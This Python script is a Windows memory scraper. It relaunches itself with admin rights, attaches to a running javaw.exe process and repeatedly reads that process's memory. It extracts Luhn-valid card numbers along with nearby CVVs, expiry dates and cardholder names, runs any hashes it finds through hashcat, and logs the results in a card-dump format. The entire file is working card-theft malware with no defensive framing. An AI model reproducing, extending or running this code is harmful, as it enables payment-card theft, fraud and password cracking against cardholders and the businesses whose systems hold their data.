import ctypes
import psutil
import re
import threading
from queue import Queue
import sys
import time
import logging
import subprocess
import keyboard  # Import keyboard library

# Constants for process access
PROCESS_VM_READ = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400

# Set up logging
logging.basicConfig(filename='log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# Queue for memory regions to scan (for threading)
memory_queue = Queue()

# Flag to control the scanning process
running = True

# Luhn's algorithm to validate credit card numbers
def validate_luhn(card_number):
    total = 0
    reverse_digits = card_number[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

# Regex patterns
cc_regex = re.compile(r'\b(?:\d[ -]*?){13,19}\b')  # Credit card number
cvv_regex = re.compile(r'\b(?:\d{3}|\d{4})\b')  # CVV code (3 or 4 digits)
expiry_regex = re.compile(r'\b(0[1-9]|1[0-2])/?(\d{2}|\d{4})\b')  # Expiry date MM/YY or MM/YYYY
name_regex = re.compile(r'\b[A-Z][a-z]+(?:\s[A-Z][a-z]+){1,2}\b')  # Improved name pattern (First Last or First Middle Last)
hash_regex = re.compile(r'\b[a-fA-F0-9]{32}\b|\b[a-fA-F0-9]{40}\b|\b[a-fA-F0-9]{64}\b')  # MD5, SHA1, SHA256

# Hashcat command for cracking hashes
def crack_hash(hash_value):
    # Save the hash to a temporary file for Hashcat
    with open("hash.txt", "w") as f:
        f.write(hash_value)

    # Construct the command to run Hashcat
    command = ["hashcat", "-m", "0", "hash.txt", "path_to_your_wordlist.txt"]

    # Run the command
    try:
        subprocess.run(command, check=True)
        with open("hashcat.potfile", "r") as f:  # Check Hashcat's output
            for line in f:
                if hash_value in line:
                    return line.split(":")[1]  # Return cracked password
    except subprocess.CalledProcessError as e:
        logging.error(f"Error running Hashcat: {e}")
    
    return "Not Found"

# Scan a buffer for potential credit card data and hashes
def scan_memory_chunk(memory_chunk):
    results = []
    card_matches = cc_regex.findall(memory_chunk)

    for card_match in card_matches:
        sanitized_card = re.sub(r'[^\d]', '', card_match)  # Remove non-numeric characters

        if validate_luhn(sanitized_card):
            match_index = memory_chunk.find(card_match)
            surrounding_text = memory_chunk[max(0, match_index - 200): match_index + 400]  # Extended search range

            # Find possible CVV, expiry date, and name nearby
            cvv_matches = cvv_regex.findall(surrounding_text)
            expiry_matches = expiry_regex.findall(surrounding_text)
            name_matches = name_regex.findall(surrounding_text)

            # Use the first matches found
            cvv = cvv_matches[0] if cvv_matches else 'Not Found'
            expiry = f"{expiry_matches[0][0]}/{expiry_matches[0][1]}" if expiry_matches else 'Not Found'
            name = name_matches[0] if name_matches else 'Not Found'

            results.append({
                'Card Number': sanitized_card,
                'CVV': cvv,
                'Expiry Date': expiry,
                'Name': name
            })
    
    # Check for hashed values in the memory chunk
    hash_matches = hash_regex.findall(memory_chunk)
    for hash_match in hash_matches:
        cracked_value = crack_hash(hash_match)
        results.append({
            'Hash': hash_match,
            'Cracked Value': cracked_value
        })

    return results

# Worker thread that processes memory chunks
def memory_scan_worker(process_handle):
    while running:
        if memory_queue.empty():
            time.sleep(1)  # Avoid busy waiting
            continue
        
        base_addr, size = memory_queue.get()
        try:
            buffer = ctypes.create_string_buffer(size)
            bytesRead = ctypes.c_size_t(0)
            if ctypes.windll.kernel32.ReadProcessMemory(process_handle, ctypes.c_void_p(base_addr), buffer, size, ctypes.byref(bytesRead)):
                valid_cards = scan_memory_chunk(buffer.raw.decode('latin-1', errors='ignore'))
                if valid_cards:
                    for card in valid_cards:
                        if 'Card Number' in card:
                            formatted_output = f"{card['Card Number']}:{card['Name']}:{card['CVV']}:{card['Expiry Date']}"
                            print(formatted_output)
                            logging.info(formatted_output)  # Log to file
                        elif 'Hash' in card:
                            formatted_output = f"Hash Found: {card['Hash']} - Cracked Value: {card['Cracked Value']}"
                            print(formatted_output)
                            logging.info(formatted_output)  # Log to file
        except Exception as e:
            logging.error(f"Error reading memory at {base_addr}: {e}")
        finally:
            memory_queue.task_done()

# Define the MEMORY_BASIC_INFORMATION structure
class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", ctypes.c_ulong),
        ("RegionSize", ctypes.c_size_t),
        ("State", ctypes.c_ulong),
        ("Protect", ctypes.c_ulong),
        ("Type", ctypes.c_ulong)
    ]

# Get memory regions to scan (only committed, readable regions)
def get_memory_regions(pid):
    process = psutil.Process(pid)
    with process.oneshot():
        handle = ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
        if not handle:
            raise Exception(f"Failed to open process {pid}")

        memory_regions = []
        address = 0
        mbi = MEMORY_BASIC_INFORMATION()

        while ctypes.windll.kernel32.VirtualQueryEx(handle, ctypes.c_void_p(address), ctypes.byref(mbi), ctypes.sizeof(mbi)):
            # Filter to committed and readable regions
            if mbi.State == 0x1000 and mbi.Protect in (0x04, 0x20, 0x40):  # PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ
                memory_regions.append((mbi.BaseAddress, mbi.RegionSize))
            address += mbi.RegionSize

        ctypes.windll.kernel32.CloseHandle(handle)
        return memory_regions

# Main function to scan memory of target process
def scan_process_memory(pid, num_threads=4):
    memory_regions = get_memory_regions(pid)
    if not memory_regions:
        print(f"No valid memory regions found for PID {pid}")
        return

    for region in memory_regions:
        memory_queue.put(region)

    process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=memory_scan_worker, args=(process_handle,))
        t.daemon = True  # Allow threads to exit when the main program does
        t.start()
        threads.append(t)

    try:
        while running:
            # Keep scanning new memory regions in a loop
            new_memory_regions = get_memory_regions(pid)
            for region in new_memory_regions:
                memory_queue.put(region)

            time.sleep(5)  # Delay between scans to reduce CPU usage

    except KeyboardInterrupt:
        print("Stopping the memory scan...")
    finally:
        for t in threads:
            t.join()
        ctypes.windll.kernel32.CloseHandle(process_handle)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def exit_program(e):  # Accept the event argument
    global running
    running = False
    print("Exiting program...")

if __name__ == "__main__":
    # Register hotkey for Ctrl + Shift + C
    keyboard.add_hotkey('ctrl+shift+c', exit_program)

    if not is_admin():
        print("Attempting to restart with admin privileges...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'javaw.exe':
            print(f"Found {proc.info['name']} with PID {proc.info['pid']}")
            scan_process_memory(proc.info['pid'])
            break
    else:
        print("javaw.exe not found.")
